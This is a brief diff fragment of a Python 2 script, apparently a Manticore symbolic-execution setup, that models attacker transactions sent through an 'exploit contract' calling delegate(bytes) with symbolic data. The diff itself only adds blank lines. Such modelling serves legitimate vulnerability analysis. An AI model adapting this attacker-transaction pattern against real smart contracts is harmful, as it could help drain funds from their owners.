@@ -129,11 +129,13 @@ seth.transaction(  caller=attacker_account,
                     data=seth.make_function_call('delegate(bytes)', seth.SByte(64)),
                     value=10)
 
+        
 print "[+] Attacker tx2 via exploit contract"
 seth.transaction(  caller=attacker_account,
                     address=exploit_account,
                     data=seth.make_function_call('delegate(bytes)', seth.SByte(64)),
                     value=0)
+
 
 print "[+] Attacker tx3 via exploit contract"
 seth.transaction(  caller=attacker_account,
